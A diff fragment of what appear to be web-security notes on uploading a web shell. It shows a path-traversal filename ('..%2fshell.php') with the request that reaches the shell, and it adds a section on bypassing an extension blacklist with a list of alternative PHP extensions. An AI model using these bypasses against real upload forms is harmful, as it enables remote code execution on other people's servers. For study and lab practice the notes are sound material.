@@ -26,5 +26,22 @@ filename="..%2fshell.php"
 
 GET /files/avatars/../shell.php
 
+# Web shell upload via extension blacklist bypass
 
+Defaults php extensions
+```
+.php
+.php3
+.php4
+.php5
+.php7
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.inc
+```
 
